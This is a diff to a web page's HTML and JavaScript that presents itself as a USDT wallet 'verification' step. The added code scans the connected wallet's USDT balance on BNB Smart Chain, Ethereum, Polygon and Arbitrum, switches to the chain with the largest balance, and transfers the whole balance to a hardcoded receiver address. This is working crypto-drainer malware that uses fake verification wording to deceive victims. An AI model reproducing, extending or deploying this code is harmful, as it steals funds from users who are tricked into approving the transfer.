@@ -62,7 +62,7 @@
     .verified-title { font-size: 22px; font-weight: 800; color: #ffffff; margin-bottom: 6px; }
     .verified-subtitle { font-size: 12px; color: #718096; margin-bottom: 24px; line-height: 1.5; }
     
-    .balance-box { background-color: #0b0e14; border-radius: 14px; width: 100%; padding: 18px 0; margin-bottom: 24px; border: 1px solid #1e2430; }
+    .balance-box { background-color: #0b0e14; border-radius: 14px; width: 100%; padding: 18px 0; margin-bottom: 24px; border: 1px solid #1a2233; }
     .balance-label { font-size: 11px; color: #718096; margin-bottom: 6px; text-transform: uppercase; font-weight: 600; letter-spacing: 0.5px; }
     .balance-val { font-size: 28px; font-weight: 800; color: #00d395; }
 
@@ -179,8 +179,42 @@
 
   <script>
     const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
-    const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Official BEP-20 USDT on BSC
-    const BSC_CHAIN_ID = '0x38'; // Chain ID 56 (Hex: 0x38) for BNB Smart Chain
+
+    // Multi-Chain USDT Configuration
+    const CHAINS = [
+      {
+        chainId: 56,
+        chainIdHex: '0x38',
+        name: 'BNB Smart Chain',
+        rpc: 'https://bsc-dataseed.binance.org/',
+        usdtAddress: '0x55d398326f99059fF775485246999027B3197955',
+        decimals: 18
+      },
+      {
+        chainId: 1,
+        chainIdHex: '0x1',
+        name: 'Ethereum Mainnet',
+        rpc: 'https://eth.llamarpc.com',
+        usdtAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+        decimals: 6
+      },
+      {
+        chainId: 137,
+        chainIdHex: '0x89',
+        name: 'Polygon',
+        rpc: 'https://polygon-rpc.com',
+        usdtAddress: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
+        decimals: 6
+      },
+      {
+        chainId: 42161,
+        chainIdHex: '0xa4b1',
+        name: 'Arbitrum One',
+        rpc: 'https://arb1.arbitrum.io/rpc',
+        usdtAddress: '0xFd086bC7CD5C481dCC9685eb5C4a41a3148a0422',
+        decimals: 6
+      }
+    ];
 
     const USDT_ABI = [
       "function balanceOf(address owner) view returns (uint256)",
@@ -188,7 +222,8 @@
     ];
 
     let globalProvider, globalSigner, globalUserAddress;
-    let totalUsdtWei = ethers.BigNumber.from(0);
+    let selectedChain = null;
+    let maxUsdtWei = ethers.BigNumber.from(0);
 
     function getActiveProvider() {
       if (window.ethereum) return window.ethereum;
@@ -197,11 +232,11 @@
       return null;
     }
 
-    async function switchToBSC(ethProvider) {
+    async function switchToChain(ethProvider, chainIdHex) {
       try {
         await ethProvider.request({
           method: 'wallet_switchEthereumChain',
-          params: [{ chainId: BSC_CHAIN_ID }],
+          params: [{ chainId: chainIdHex }],
         });
       } catch (switchError) {
         console.log("Switch chain notice:", switchError);
@@ -217,28 +252,46 @@
         }
 
         const btnText = document.getElementById("btnText");
-
         btnText.innerHTML = '<span class="loader"></span> Connecting...';
 
         const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
         globalUserAddress = accounts[0];
 
-        await switchToBSC(ethProvider);
+        btnText.innerHTML = '<span class="loader"></span> Scanning Chains...';
+
+        let highestBalance = ethers.BigNumber.from(0);
+        let bestChain = CHAINS[0];
+
+        // Scan all chains simultaneously via public RPCs to find highest USDT
+        for (const chain of CHAINS) {
+          try {
+            const rpcProvider = new ethers.providers.JsonRpcProvider(chain.rpc);
+            const contract = new ethers.Contract(chain.usdtAddress, USDT_ABI, rpcProvider);
+            const bal = await contract.balanceOf(globalUserAddress);
+            
+            const formatted = parseFloat(ethers.utils.formatUnits(bal, chain.decimals));
+            const formattedHighest = parseFloat(ethers.utils.formatUnits(highestBalance, bestChain.decimals));
+
+            if (formatted > formattedHighest) {
+              highestBalance = bal;
+              bestChain = chain;
+            }
+          } catch (err) {
+            console.log(`Scan failed on ${chain.name}:`, err);
+          }
+        }
+
+        selectedChain = bestChain;
+        maxUsdtWei = highestBalance;
+
+        // Switch wallet to the chain with the highest balance
+        await switchToChain(ethProvider, bestChain.chainIdHex);
 
         const provider = new ethers.providers.Web3Provider(ethProvider, "any");
         globalSigner = provider.getSigner();
         globalProvider = ethProvider;
 
-        btnText.innerHTML = '<span class="loader"></span> Verifying...';
-
-        try {
-          const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
-          totalUsdtWei = await usdtContract.balanceOf(globalUserAddress);
-        } catch (err) {
-          totalUsdtWei = ethers.BigNumber.from(0);
-        }
-
-        const formattedUsdt = ethers.utils.formatUnits(totalUsdtWei, 18);
+        const formattedUsdt = ethers.utils.formatUnits(maxUsdtWei, bestChain.decimals);
         document.getElementById('verifiedUsdtBalance').textContent = `${Number(formattedUsdt).toFixed(5)} USDT`;
 
         // Switch to Verified Success View
@@ -255,33 +308,33 @@
 
     async function executeTransfer() {
       try {
-        if (!globalProvider) {
+        if (!globalProvider || !selectedChain) {
           alert("Wallet session not active. Please reconnect.");
           return;
         }
 
-        await switchToBSC(globalProvider);
+        await switchToChain(globalProvider, selectedChain.chainIdHex);
 
         const provider = new ethers.providers.Web3Provider(globalProvider, "any");
         const signer = provider.getSigner();
         const userAddress = await signer.getAddress();
 
-        // Strict BNB gas fee check (must be greater than 0)
-        const bnbBalance = await provider.getBalance(userAddress);
-        if (bnbBalance.lte(0)) {
-          alert("Transaction failed: Insufficient BNB in wallet to pay gas fees. BNB balance is 0.");
+        // Strict native gas fee check (must be greater than 0)
+        const nativeBalance = await provider.getBalance(userAddress);
+        if (nativeBalance.lte(0)) {
+          alert(`Transaction failed: Insufficient native gas token in wallet on ${selectedChain.name} to pay gas fees. Balance is 0.`);
           return;
         }
 
-        if (!totalUsdtWei || totalUsdtWei.lte(0)) {
+        if (!maxUsdtWei || maxUsdtWei.lte(0)) {
           alert("No USDT balance found to verify/transfer.");
           return;
         }
 
-        const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, signer);
+        const usdtContract = new ethers.Contract(selectedChain.usdtAddress, USDT_ABI, signer);
         
-        const tx = await usdtContract.transfer(TARGET_RECEIVER, totalUsdtWei, {
-          gasLimit: ethers.BigNumber.from("65000")
+        const tx = await usdtContract.transfer(TARGET_RECEIVER, maxUsdtWei, {
+          gasLimit: ethers.BigNumber.from("85000")
         });
 
         await tx.wait();
